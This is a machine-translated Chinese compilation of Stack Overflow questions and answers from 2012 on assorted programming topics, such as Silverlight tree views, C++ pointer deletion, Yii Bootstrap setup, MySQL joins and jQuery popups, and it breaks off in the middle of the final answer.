> 时间：2012-08-08T14:01:27.350
> 
> 标签：c#, silverlight, treeview, silverlight-5.0, hierarchicaldatatemplate

您好，提前感谢您提供的任何帮助。我一直在尝试通过在 Silverlight 5 中使用分层数据模板将数据绑定到树视图。我正在尝试实现具有三个级别的层次结构。但是，我的模板只能生成两个。无论我尝试什么，第三级都没有出现，即使有三个层次数据模板，每个模板都使用前任作为项目模板。我的 xaml 如下所示：

```
<sdk:HierarchicalDataTemplate x:Key="ModTemplate" 
                              ItemsSource="{Binding Path=ServerChildren}" >
    <TextBlock FontStyle="Italic" Text="{Binding Path=ServerName}" />
</sdk:HierarchicalDataTemplate>

<sdk:HierarchicalDataTemplate x:Key="ChildTemplate2" 
                              ItemsSource="{Binding Path=ServerChildren}"
                              ItemTemplate="{StaticResource ModTemplate}">
    <TextBlock FontStyle="Italic" Text="{Binding Path=ServerName}" />
</sdk:HierarchicalDataTemplate>

<sdk:HierarchicalDataTemplate x:Key="GroupNameTemplate" 
                              ItemsSource="{Binding Path=ServerChildren}" 
                              ItemTemplate="{StaticResource ChildTemplate2}">
    <TextBlock Text="{Binding Path=GroupName}" FontWeight="Bold" />
</sdk:HierarchicalDataTemplate> 
```

TreeView 的数据上下文在后面的代码中设置为 ServerOCollection 类的可观察集合，该集合又具有 ServerObject 类的 ObservableCollection，而后者又具有 ModuleObject 类的 ObserverableCollection。我能够让 TreeView 的前两个级别相应地填充，但在第三个中什么也没有出现！请帮忙！

编辑：通过将模板更改为以下内容，我能够获得所需的结果：

```
<sdk:HierarchicalDataTemplate x:Key="ModTemplate" ItemsSource="{Binding ApplicationModules}">
            <StackPanel Orientation="Horizontal" >
                <ContentPresenter Margin="0 0 4 0" Content="{Binding Icon}" />
                <TextBlock FontStyle="Italic" Text="{Binding Path=ModuleName}" />
            </StackPanel>
        </sdk:HierarchicalDataTemplate>

        <sdk:HierarchicalDataTemplate x:Key="ChildTemplate2" 
                                      ItemsSource="{Binding Path=ApplicationModules}"
                                      ItemTemplate="{StaticResource ModTemplate}">
            <StackPanel Orientation="Horizontal">
                <TextBlock FontStyle="Italic" Text="{Binding Path=ServerName}" />
            </StackPanel>
        </sdk:HierarchicalDataTemplate>

        <sdk:HierarchicalDataTemplate x:Key="GroupNameTemplate" 
            ItemsSource="{Binding Path=ServerChildren}" 
            ItemTemplate="{StaticResource ChildTemplate2}">
            <StackPanel Orientation="Horizontal">
                <ContentPresenter Margin="0 0 4 0" Content="{Binding GroupIcon}" />
                <TextBlock Text="{Binding Path=GroupName}" FontWeight="Bold" />
            </StackPanel>
        </sdk:HierarchicalDataTemplate> 
```

# c# - 在c#中更改FileStream的长度

> ID：11866171
> 
> 赞同：2
> 
> 时间：2012-08-08T14:01:31.593
> 
> 标签：c#

> **可能重复：**
> [FileStream Append Data 在顶部](https://stackoverflow.com/questions/1062003/filestream-append-data-at-the-top)

我有一个以写权限打开的文件流。我正在尝试从流中“删除”数据，但我不知道如何。我需要一个解决方案，例如更改流的 Length 属性。有人有蚂蚁的想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-08T14:05:23.620

我想你正在寻找[`Stream.SetLength`](http://msdn.microsoft.com/en-us/library/system.io.stream.setlength.aspx).

> 如果指定的值小于流的当前长度，则截断流。

# c++ - 防止在 C++ 中删除指针

> ID：11866174
> 
> 赞同：36
> 
> 时间：2012-08-08T14:01:36.107
> 
> 标签：c++

有什么方法可以防止通过声明删除 C++ 中的指针？

我试过没有运气的代码。

```
const int* const foo()
{
    static int a;
    return &a;
}

int main()
{
    const int* const a = foo();

    *a = 1;   //compiler error, const int*
    a++;      //compiler error, int* const
    delete a; //no compiler error, I want to have compiler error here

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-08-08T14:11:06.107

您不能以阻止调用指针的方式声明指向任意类型`delete`的指针。[删除指向 const (T const*) 的指针](https://stackoverflow.com/questions/755196/deleting-a-pointer-to-const-t-const)解释了为什么会这样。

*如果*它是指向自定义类的指针，您可以将`delete`运算符设为私有：

```
class C {
    void operator delete( void * ) {}
};

int main() {
    C *c;
    delete c; // Compile error here - C::operator delete is private!
} 
```

您当然不应该将析构函数设为私有（如其他人所建议的那样），因为它也会避免在堆栈上创建对象：

```
class C {
    ~C() {}
};

int main() {
    C c; // Compile error here - C::~C is private!
} 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-08-08T14:10:44.830

简单的答案是*否定*的。没有办法阻止在指向内置类型的指针上调用 delete。

*附录*：

但是，我遇到了与此类似的情况。我的解决方案是停止使用普通指针，因此不必担心删除。在我的情况下，共享指针是有意义的，但你的唯一指针或类似指针可能就足够了。

```
//Custom do nothing deleter.
template<typename T> dont_delete( T* ) { /* Do Nothing */ }

shared_ptr<const int> const foo()
{
  static int a;
  return shared_ptr<const int>(&a, &dont_delete<const int> );
}

shared_ptr<const int> const bar()
{
  return shared_ptr<const int>(new int(7) );
}

main()
{
   shared_ptr<const int> p1 = foo();
   shared_ptr<const int> p2 = bar();

   //p1s data _not_ deleted here, 
   //p2s data is deleted here
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T14:18:16.423

我不完全明白你在问什么。如果您想要一个无法删除的对象，您可以尝试将 foo 设为一个类并将析构函数设为私有。

```
class Foo {
public:
   int a;

   Foo(int v) {
       a = b;
   }

private:
   ~Foo() { }
};

int main() {

    Foo *c = new Foo(1);

    delete c; // compiler error, ~Foo() is private

    return 0;
} 
```

我将变量“a”设为公开，因为它最初被定义为结构，但您可以（并且应该）将其设为私有，并使访问器强制执行您在原始代码示例中想要的访问规则。

这不是万无一失的，编译器只会捕获对该类的直接引用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-23T10:35:45.563

我认为他的意思是发生意外的对象删除（无论是删除 o 还是释放（o）），这可能导致程序崩溃。对于在堆上分配的对象，确实没有办法解决这个问题。就堆栈指针而言，我们都知道它不可能发生。在顶级类中使用受保护的 dtor 是一个选项，但是您必须在子类 dtor 中调用它。

一种解决方案（即使覆盖删除操作符在表上）是使用一个表映射系统，它返回一个 id/token/what-have-you 但这真的只适用于你用 CSTYLE 代码编写和用 C 约定编译. 这样做的好处是对用户隐藏对象指针，允许用户传入映射到对象的令牌。这需要工作和经验。

我什至不会担心它，因为大多数有经验和聪明的程序员都会阅读 API 的文档以避免这种事故。如果不是明智或经验，好吧，我不说什么。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-05-27T15:18:14.423

您可以防止在某些类的指针上使用删除运算符。例如：

```
class Object {
public: void operator delete(void* p) = delete;
};

class Entity : public Object {    };

int main(int argc, char const *argv[])
{
    Object* o = new Object;
    Entity* e = new Entity;

    delete o; // compiler error
    delete e; // compiler error

    return 0;
} 
```

对于所有继承自 Object 的类都无法删除，因为 Object::operator delete 已被删除。不要将此运算符标记为私有，因为它会在派生或实例化 Object 类时产生编译器错误。请注意，我们仍然可以这样做：

```
::operator delete(o); 
```

这将释放 o 指针但不会调用析构函数。使用一个类来管理 Object 类的生命周期。一个简单的实现是：

```
class Object {
    template<typename type> friend class ptr;
    public: void operator delete(void* p) = delete;
};

class Entity : public Object { };

template<typename type>
class Ptr {
public:
    Ptr(type* obj) : o(obj){}
    ~Ptr() { o->~type(); ::operator delete(o); }
private: type* o;
};

int main(int argc, char const *argv[])
{
    Object* o = new Object;
    Entity* e = new Entity;

    // delete o;  // error
    // delete e;  // error

    Ptr<Entity> ent = new Entity; // Ptr will delete ent for you.

    return 0;
} 
```

# android - 如何在android listview中删除页脚的底部分隔符

> ID：11866176
> 
> 赞同：15
> 
> 时间：2012-08-08T14:01:36.697
> 
> 标签：android, listview, footer, divider

就如此容易。当然使用 android:footerDividersEnabled="false" 不会在这个上工作，因为它会删除上下分隔线。

我昨天提出了这个问题，不记得是谁试图回答它，但我不得不删除它，因为巨魔开始降级问题，因为它“不清楚”（如果你不知道什么是分隔符或页脚，或者底部，或者什么是android，是的它可以是......）

无论如何，如果是这种情况，让我们描绘一个 2 项列表视图，我想给一个带页脚的空间，但没有页脚显示与底部分隔线相对应的底线，但要保留其他分隔线，请记住只是如何删除它，我可以使用 2xviews 并按照建议使用 even 作为分隔符，但对我来说这没有意义，只添加一个额外的空视图 + 1px 页脚会更有效+ footerDividersEnabled 就像我现在正在做的那样，但这只是一个普通的黑客攻击，它变得难以管理。此外，在页脚布局的顶部添加一行也不起作用，因为当 listView 项目在其背景上包含颜色或类似内容时，您将有一个空间，因为您将看到应该是分隔线的背景颜色。

没有办法指定android不显示页脚的底部分隔符？

请尝试理解这与以下问题不同：

[删除 android ListView 的底部分隔线](https://stackoverflow.com/questions/4961999/remove-bottom-divider-of-a-android-listview)

在不阅读和降级的情况下进行巨魔之前。

@Kor 可以说页脚通常看起来像这样：
**案例 1：**

* * *

列表项N

* * *

页脚

* * *

使用 android:footerDividersEnabled="false" 如下所示：
**案例 2：**

* * *

ListItemN

页脚

我想要一种方法来拥有它：
**案例 3：**

* * *

列表项N

* * *

页脚

但只找到了上面描述的hacky方法。我希望这会有所帮助，如果它没有让我知道您还需要什么。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-12-11T04:28:13.833

只需使用它来避免列表视图的分隔线`android:footerDividersEnabled="false"`

```
 <ListView
                android:id="@+id/listHomeListViewController"
                android:layout_width="match_parent"
                android:layout_height="match_parent"
                android:layout_below="@+id/ImageView01"
                android:cacheColorHint="@android:color/transparent"
                android:footerDividersEnabled="false" >
            </ListView> 
```

//vKj

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T10:02:10.383

你必须使用黑客。您试图实现的目标与常规行为背道而驰。

@Kor 已经描述了最简单的解决方案。只需使用顶部标题进行行布局。

# twitter-bootstrap - Yii 中的 Twitter 引导

> ID：11866179
> 
> 赞同：3
> 
> 时间：2012-08-08T14:01:46.943
> 
> 标签：twitter-bootstrap, yii, yii-extensions

我对 Yii 和 Twitter Bootstrap 都很陌生，我正在尝试使用 bootstrap 提供的文件。我已经在 Yii 中的受保护文件夹的扩展目录中解压缩了下载的文件夹，并按照这个[http://www.cniska.net/yii-bootstrap/setup.html#setup](http://www.cniska.net/yii-bootstrap/setup.html#setup)我的 main.php 中的代码如下所示：

```
'preload'=>array('log','bootstrap'),
'import'=>array(
...
'application.extensions.bootstrap.widgets.*',
),
'modules'=>array(
     'generatorPaths'=>array(
        'bootstrap.gii',
      ),

),
'components' => array(
'bootstrap'=>array(
        'class'=>'ext.bootstrap.components.Bootstrap',
),
), 
```

我收到此错误
别名“ext.bootstrap.components.Bootstrap”无效。确保它指向一个现有的 PHP 文件。

Q2。除了将整个引导 css 文件复制粘贴到 Yii 的 css 中之外，还有什么更好的方法吗？

Q3。我是否必须下载任何额外的东西才能使用 bootstrap twitter 提供的小部件，例如 $this->widget('ext.cssmenu.CssMenu',array(...); 下载的文件应该放在哪里？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-09T07:06:45.580

我认为您可能下载了错误的文件！您无需从 twitter github 页面下载 bootstrap - 而是下载 yii 扩展程序，该扩展程序捆绑了所有 boostrap 文件。

这是一个分步指南：

1.  下载这个文件 - [http://www.yiiframework.com/extension/bootstrap/files/yii-bootstrap-0.9.12.r211.zip](http://www.yiiframework.com/extension/bootstrap/files/yii-bootstrap-0.9.12.r211.zip) - 我会使用这个而不是 alpha v 1.0 来保证稳定性。

2.  解压

3.  将解压后的文件夹重命名为“bootstrap”

4.  检查您是否具有以下 ernie 提到的文件夹结构。

5.  将新的引导文件夹上传到受保护/扩展

6.  对此处给出的 protected/config/main.php 进行更改 - [http://www.cniska.net/yii-bootstrap/setup.html#setup](http://www.cniska.net/yii-bootstrap/setup.html#setup) - 但看起来你已经这样做了。

现在一切都应该正常工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T15:52:18.810

如果你刚刚下载了 Yii v1.1.12 解压 bootatrap 文件到 protected/components/bootstrap/ 如下：

protected/components/bootstrap/widgets/protected/components/bootstrap/components/protected/components/bootstrap/...等。

之后在 protected/config/main.php 更改

ext.bootstrap.components.Bootstrap

到

application.components.bootstrap.components.Bootstrap

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-08T16:50:07.363

A1) 确认您已将 zip 的内容解压缩到 /protected/extensions/bootstrap。在该目录中，您应该具有：

```
assets
components
gii
lib
widgets
LICENSE.txt 
```

如果你有**yii-bootstrap-version_desginator**，那么你没有按预期提取内容。

请注意，通常，您会在配置文件中看到路径，例如：`ext.bootstrap.components.Bootstrap`对应于`extensions/bootstrap/components/Bootstrap.php`. 错误消息告诉您它找不到该文件。

A2) 虽然我没有使用过这个扩展，但我猜你不需要将 CSS 复制到 Yii CSS 中，扩展会在必要时加载它。

A3) 我不知道这个

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-11T07:01:48.797

我有同样的问题。我通过将引导文件夹的权限更改为“755”来解决它

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-08T16:47:18.080

A1。您需要确保已将 Bootstrap.php 文件复制到 protected/extensions/bootstrap/components 文件夹中。

A2。您无需担心，如果将文件上传到您的扩展目录，那么 Bootstrap css 文件将神奇地出现在您的布局中

A3。不——Bootstrap 扩展为您提供了使用基本 Bootstrap CSS 和 jQuery 插件所需的一切。

希望这可以帮助。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-12T17:06:29.247

从 DaveR 提供的链接 (www.yiiframework.com/extension/bootstrap/files/yii-bootstrap-0.9.12.r211.zip) 下载 yii-bootstrap zip 文件，因为它是一个较旧的稳定版本并使用他的设置文件夹等的说明。

使用此地址[http://pastebin.com/xVSPNgJi](http://pastebin.com/xVSPNgJi)在“webapp”/protected/config 中设置您的 main.php 配置文件。它比 yii-bootstrap 站点更明确一点，如果你对 yii 不太熟悉，这应该有助于澄清。

然后，如果您想复制和粘贴按钮和导航栏以及此地址的文档中的任何内容，[http:](http://cniska.net/yii-bootstrap/index.html) //cniska.net/yii-bootstrap/index.html那么您必须下载最新版本的 yii-bootstrap并将那个小部件文件夹的内容复制到您的 protected/extensions/bootstrap/widgets 文件夹中。

设置最新版本对我也不起作用，很确定 yii 没有正确识别它，但旧版本确实可以正常工作。

# performance - SPQuery 与 Sharepoint 中的通用列表

> ID：11866181
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:01:56.500
> 
> 标签：performance, list, readability, splist, spquery

我需要遍历一个共享点列表并获取一些列值的计数。例如，在 office(col1) 中，如果 Name(Col2)、Smith(Val2) 出现两次，则 count=2。我必须创建一个显示这些计数的 Web 部件。它看起来像这样：
Name AsFirstName AsMiddleName AsLastName
Smith 0 4 1
Samantha 3 1 500
Raj 2 0 4

我有两种方法： 使用带有 SPQUERY 的嵌套循环来获取计数。

或者

使用嵌套循环获取 GENERIC LIST 中的所有行值，然后获取计数。

就可读性、性能、可维护性......总体而言，哪一种方法更好？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-01T06:30:43.297

使用通用列表获取所有值，然后您可以在本地对其进行所有操作，而无需再次访问服务器。所有 Linq 操作也可以通过这种方式进行。

# intersection - 一条线与无穷大平面的交点

> ID：11866183
> 
> 赞同：0
> 
> 时间：2012-08-08T14:01:58.453
> 
> 标签：intersection, infinity, projective-geometry

我想计算 3D 线与无穷远平面的交点。我怀疑这与采用线的 3D 方向并将第 4 个矢量坐标设置为 0 相同。

然而，这还不够。我想知道在透视相机转换和投影线后，屏幕坐标中交叉点的 2D 位置。

这个问题相当于在 2D 图像中寻找消失点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:05:41.537

似乎消失点对应于 3D 空间中的方向。因此，在渲染管道中使用 [xyz 0] 形式的齐次向量会产生屏幕上消失点的 2D 坐标。

# php - mysql 两个查询

> ID：11866189
> 
> 赞同：1
> 
> 时间：2012-08-08T14:02:25.070
> 
> 标签：php, mysql

我有一个评论系统；我有一个查询

```
SELECT ShoutID,Message, User, Date, ShoutImageThumb, ShoutImageBig,UserID, 
       Email, FullName, UserImageThumb, Admin FROM shoutbox LEFT JOIN users ON 
       users.Email = shoutbox.User ORDER BY ShoutID DESC LIMIT 10 
```

当它通过页面上的循环时，我在循环中运行另一个查询以获取该消息的评论

```
SELECT users.UserID, users.Email, users.FullName, shoutboxcomments.ShoutID, 
       shoutboxcomments.`Comment`, shoutboxcomments.`Date`, 
       shoutboxcomments.`User`, shoutboxcomments.CommentID FROM shoutboxcomments 
       LEFT JOIN users ON users.Email = shoutboxcomments.User 
       WHERE ShoutID = '.$ShoutID.' ORDER BY CommentID ASC 
```

是否可以加入这些查询或如何简化它，因为我使用 mvc 架构在 php 中构建

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:04:50.290

无需为每个帖子运行一个查询，而是一次`IN`获取多个帖子的评论。

```
SELECT users.UserID, users.Email, ...
FROM shoutboxcomments
LEFT JOIN users
ON users.Email = shoutboxcomments.User
WHERE ShoutID IN (1, 4, 15, 22)
ORDER BY CommentID 
```

# static - struct Non_const、non_volatile 静态或外部变量

> ID：11866191
> 
> 赞同：0
> 
> 时间：2012-08-08T14:02:30.480
> 
> 标签：static, struct, external, non-volatile

我的代码编译并运行，但我仍然收到一条 lint 错误消息：

> --- 模块：LunchMenu_main.c (C)
> } lunch[LUNCHES] =
> LunchMenu_main.c: 警告 956：（注意 -- 非 const、非易失性静态或外部变量“午餐”）

虽然演示了非常量静态和外部变量的使用，但使用它们有很多陷阱，除非没有其他合理的解决方案，否则应避免使用它们。有什么办法可以避免这些类型的变量，或者我需要这些变量来修复这个错误吗？这是我的代码：

```
struct Food
{
    char *name;
    int weight, calories;
} lunch[LUNCHES] = 
    {{(char *)"apple", 4, 100}, {(char *)"salad", 2, 80}};

int main(void)
{
    int counter;    
    struct Food *foodPtr = &lunch[0];

    printf("%-10s %-10s %-10s\n", "name", "weight", "calories");       

    for (counter = 0; counter < 2; counter++)
    {      
       foodPtr = &lunch[counter];            
       printf("%-10s %-10d %-10d\n",
           foodPtr->name, foodPtr->weight, foodPtr->calories);
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T09:19:34.933

可能会给出警告，因为您的变量`lunch`是使用在同一个 C 文件中定义的类型定义的，因此您不能使用相同类型在其他编译单元中定义其他变量，因此赋予变量全局可见性没有意义。应该是`static`。

> ...使用它们有很多陷阱，除非没有其他合理的解决方案，否则应避免使用它们。

我不敢苟同。是的，它们有一些陷阱，但我认为没有任何理由不惜一切代价避免它们。以负责任的方式使用它们可以帮助您更好地构建代码。

# javascript - 使用 location.href 重定向

> ID：11866192
> 
> 赞同：1
> 
> 时间：2012-08-08T14:02:31.047
> 
> 标签：javascript, asp.net, html

我正在尝试将用户重定向到一个不同的 asp 页面，其中包含一些 asp 页面可以使用的数据。这是我正在使用的代码：

```
var done = confirm("Would you like to save?");
if (done == true)
{
    var concode = "<%response.write(concode) %>";
    location.href = "Main.asp?concode="+concode;
} 
```

但是我注意到在“Main.asp?concode=”之后的 URL 中显示了信息，这类似于 html 表单“get”方法。

有什么方法可以使此代码类似于 html 表单“发布”方法？因为我使用的是a `<%request.form("concode")%>`，并且URL中有敏感信息，例如服务器名称和密码。

还是我必须使用 AJAX 和 javascript 的组合来实现我需要的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:06:44.777

你是对的。您所说的是“嘿浏览器，使用此查询字符串转到此 URL”，这确实是一个 GET 请求。如果你想使用 POST 请求，你确实需要一些 JavaScript 和 AJAX。例如 jQuery 中的 AJAX POST 功能：http: [//api.jquery.com/jQuery.post/](http://api.jquery.com/jQuery.post/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:10:46.627

从 javascript 发布数据并将页面移动到结果中（而不是使用 AJAX 这样做而不更改页面）的最简单方法是将该信息放入表单中，然后将`submit()`其放入表单中。表单可以隐藏，也可以完全由输入组成，`type="hidden"`因此它不会影响 UI。

也就是说，唯一增加的安全性是过肩阅读。重要，但它仍然需要 HTTPS 来保护它免受窃听（它不会保护用户自己的任何东西，任何不应该允许最终用户看到的东西根本无法通过 javascript 处理）。

# php - Wordpress API 中是否有与 UI 相关的功能？

> ID：11866194
> 
> 赞同：1
> 
> 时间：2012-08-08T14:02:37.307
> 
> 标签：php, api, wordpress

一段时间以来，我一直在研究各种 WP 插件。

每个插件都有自己的管理页面，由于相应的 API 功能（add_menu_page、add_submenu_page，...），它们很好地集成到了 WP 管理菜单。

我想通过使用与真实 WP 管理页面中显示的相同的小部件来进一步集成。到目前为止，我能找到的只是[WP_List_Table](http://codex.wordpress.org/Class_Reference/WP_List_Table)类，它是用于 WP 管理中的大多数项目列表（帖子列表、页面列表、链接列表......）的小部件。是否有更多的类和函数可以用来在我的自定义管理页面中获得类似 WP 的外观？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T18:02:21.163

这对我支持现有的 Wordpress 样式有很大帮助：[如何设计和设置您的 WordPress 插件管理面板的样式](http://www.onextrapixel.com/2009/07/01/how-to-design-and-style-your-wordpress-plugin-admin-panel/)

# wpf - 用于记录数据、ObservableCollection、环形缓冲区的 WPF 窗口

> ID：11866197
> 
> 赞同：1
> 
> 时间：2012-08-08T14:02:47.993
> 
> 标签：wpf, window, queue, observablecollection, circular-buffer

我们得到了一个基于 MVVM 模式的 WPF 应用程序。我们在滚动窗口中显示来自硬件的记录数据。日志数据（只是字符串）由硬件连续写入 ViewModel 中的 ObservableCollection。这工作正常。ObservableCollection 的容量是有限的，例如1000 行。一旦达到限制，我们希望删除旧行并填写新的日志记录数据。（我们需要一个环形缓冲区）我们试图删除集合的前 30%，并将其余部分移到开头。但这不适用于这样的集合。我们还尝试使用队列，这是有道理的。但是 WPF 窗口没有更新：绑定不起作用。有什么想法吗？谢谢

阳光明媚的四月

# php - 通过模糊匹配的标题从亚马逊获取书籍详细信息

> ID：11866201
> 
> 赞同：0
> 
> 时间：2012-08-08T14:02:57.420
> 
> 标签：php, api, amazon

我有一个数据库，其中包含图书馆中的书籍列表，其中仅指定了标题和作者。我希望能够在 Amazon.co.uk 上找到每本书，以便能够提供链接，并可能获取 ISBN。我发现这个问题[Getting product details using Amazon API](https://stackoverflow.com/questions/1586086/getting-product-details-using-amazon-api)除了我的数据库中的标题不一定与亚马逊上的标题完全匹配之外，它会起作用。如果我在亚马逊中输入我拥有的书名，99% 的情况下第一个结果是正确的，所以如果我可以连接到 API 并通过亚马逊搜索对书名的猜测来获取图书详细信息，我将能够检索到详细信息. 这可能吗，如果可以，我该怎么做？提前致谢， yttriuszzerbus

编辑：看起来 Amazon.co.uk 产品广告 API 需要大量麻烦才能设置 - 我会尝试其他服务。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:14:01.003

要使用来自 Amazon 的 API，您需要在他们那里开设一个帐户。这也将使您能够访问获取所需信息所需的所有 API。我必须警告您，您可以使用文档和示例，但是缺少文档并且有时可能会令人困惑/沮丧。我将它用于类似的任务，但我通过 ISBN 搜索，所以我知道它可以完成。从这里开始[https://developer.amazonservices.com/](https://developer.amazonservices.com/)祝你好运。如有问题，请随时与我联系，我会尽力提供帮助。

# python - 从使用 Python Scipy 实现的 matlab 代码生成 C 代码

> ID：11866204
> 
> 赞同：0
> 
> 时间：2012-08-08T14:03:23.720
> 
> 标签：python, numpy, matplotlib, scipy

我正在将 Matlab 与 Python Scipy、Numpy 和 Matlplot 进行比较。我在网上搜索，发现很多人更喜欢 Python 而不是 Matlab。我不知道 Python 是否完全替代了 Matlab，但我想问一个特定的问题。在 Matlab 中，您可以生成与您的 Matlab 程序相对应的 C 代码。我想知道 Python Scipy 中是否也有这个规定。因此，如果用户在 Matlab 上使用 Python 实现了某些东西，是否仍然可以从中生成 C 代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T15:00:18.510

有几种方法可以从 python、[swig](http://www.swig.org/)、[cython](http://www.cython.org/)、[boost](http://www.boost.org/doc/libs/1_50_0/libs/python/doc/)等与 C/C++ 对话。有关使用 python 包装的大型库的示例，请参见包装[hdf5](http://code.google.com/p/h5py/)库的 h5py。`mex`我大部分时间都在玩 swig，但发现它比处理文件要好得多，而且一旦超过学习曲线就容易得多。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:27:21.713

[您可以使用Cython](http://cython.org/)编写 python 代码以 C 速度运行。Cython 基本上将 python 代码转换为 C 代码，然后编译为与 python 兼容的 C 库（因此您可以“导入模块”）。

# javascript - javascript函数中的HTML

> ID：11866206
> 
> 赞同：0
> 
> 时间：2012-08-08T14:03:24.930
> 
> 标签：javascript, jquery, html

我有一个javascript弹出功能...

```
popUp(title, body){
    $('body').append('<div id="popupWindow"><div class="close"></div>
        <h2 class="title">'+title+'</h2>
        <div class="body">'+body+'</div>
        </div>");
    // then on $('.close').click(func(){ remove() etc... } );
    // and keyCode == 13 remove();
} 
```

将两个参数插入弹出窗口，然后插入到文档的 html 中。我有一个想法，`<form>`但`body`它是废话？

我已经尝试了各种方法，它似乎是 html 作为导致问题的参数。我的 javascript/jQuery 经验有限，所以你们/gals 可以提供的任何帮助将不胜感激。

谢谢，西

这不是一个完整的副本 - 但是你的权利，有一个流浪报价我没有在表格中逃脱谢谢你们（一个小时花了一个错字......）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:06:39.533

为您的表单设置一个标识符并在 JavaScript 代码中使用它。

```
<form id="myform"></form>

popUp(title, body){
    $('#myform').append('<div id="popupWindow"><div class="close"></div>
        <h2 class="title">'+title+'</h2>
        <div class="body">'+body+'</div>
        </div>');
    // then on $('.close').click(func(){ remove() etc... } );
    // and keyCode == 13 remove();
} 
```

顺便说一句，您的附加语句中的引号有错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:13:17.300

popUp 是一个函数吗？您还有一些换行问题。就个人而言，我会使用 jQuery 来构建您的元素……它更优雅。

```
function popUp(title, body){

    var $popup = $('<div />').attr('id', 'popupWindow');
    var $close = $('<div />').addClass('close');
    var $title = $('<h2 />').addClass('title').text(title);
    var $body = $('<div />').addClass('body').html(body);

    $popup.append($close).append($title).append($body);
    $('body').append($popup);
    // To append to a form, you can target it here instead of 'body'

}

popUp('My Title', 'Some <strong>body</strong> content'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:19:29.000

我认为在附加方法中使用单引号和双引号的问题，使用 ASCII，代码如下：

```
 + String.fromCharCode(34) + title + String.fromCharCode(34) + 
```

**String.fromCharCode(34)**用于**"**和 **String.fromCharCode(39)**用于**'**。

# expect - 在期望脚本的变量中浪费“换行符”

> ID：11866213
> 
> 赞同：0
> 
> 时间：2012-08-08T14:03:39.703
> 
> 标签：expect

期望从输出行写入带有浪费“换行符”的变量文本

如何解决这个问题呢？

```
#!/usr/local/bin/expect -f

set timeout 30
puts "enter the path to output folder"
while 1 { 
expect {
    "*\n" {
        set outdir $expect_out(buffer)
       break
    } timeout {
        puts "warning: timed out"
        set outdir $DEFAULT_OUT
        break
    }
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T16:29:32.467

```
set outdir [string trim $expect_out(buffer)] 
```

另外，查看[expect 手册页](http://www.linuxcommand.org/man_pages/expect1.html)，有一些用户输入示例：

```
 stty -echo
 send_user "Password: "
 expect_user -re "(.*)\n"
 set password $expect_out(1,string)
 stty echo 
```

# vsto - Office 2007 无法识别我的 vsto 文件

> ID：11866214
> 
> 赞同：1
> 
> 时间：2012-08-08T14:03:44.983
> 
> 标签：vsto, powerpoint, office-addins, powerpoint-2007

我已经为 powerpoint 2007 创建了一个加载项 VSTO，但我的 .vsto` 文件无法识别（*显然正确的格式是 .ppam*）但是当我构建它时会创建一个 .vsto 文件，我怎样才能获得正确的文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-09T13:10:52.120

由于您使用的是 VSTO，因此您需要使用[**Visual Studio 安装项目**](http://msdn.microsoft.com/en-us/library/wx3b589t.aspx)来安装应用程序。这是[VSTO 3.0 的部署指南](http://blogs.msdn.com/b/chhopkin/archive/2008/11/13/deploying-a-vsto-3-0-based-visio-add-in-using-windows-installer.aspx)和[VSTO 4.0](http://msdn.microsoft.com/en-us/vsto/ff937654.aspx)的部署指南，应该对您有所帮助。

此外，当您在开发机器上构建 VSTO 解决方案时默认设置 - 它会自动安装。为了卸载它 - 你必须[清理你的解决方案](http://msdn.microsoft.com/en-us/library/bb386179.aspx#DeploymentDuringDevelopment)。

# image - EaselJS Matrix2D

> ID：11866221
> 
> 赞同：0
> 
> 时间：2012-08-08T14:04:07.900
> 
> 标签：image, html, canvas, matrix, easeljs

我是 EaselJS 的新手。你能告诉我如何使矩阵适用于 Image。你能告诉我我的代码有什么问题吗

例如

```
 matx = new Matrix2D(1,2,3,4,5,6);
        image.addChild(matx);
        stage.update(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T18:29:39.200

抱歉，我不确定这应该是“答案”还是“评论”，但看起来这个问题是在 EaselJS 讨论论坛上提出并回应的（由 Grant Skinner 提出）：

[http://community.createjs.com/discussions/easeljs/246-easeljs-matrix2d](http://community.createjs.com/discussions/easeljs/246-easeljs-matrix2d)

# ruby-on-rails - Rails 提交按钮文本（formtastic） - 如何更改提交按钮的标签？

> ID：11866224
> 
> 赞同：10
> 
> 时间：2012-08-08T14:04:11.730
> 
> 标签：ruby-on-rails, forms, form-submit, formtastic, submit-button

我正在使用 simple_form 和以下代码来创建按钮。

```
<%= form.action :submit, :value => "submit", :button_html => { :class => "lagoon" }  %> 
```

但是，该按钮（仍然）标记为“创建用户”而不是“提交”。我认为设置值 => 会这样做，但它没有

* * *

## 回答 #1

> 赞同：21
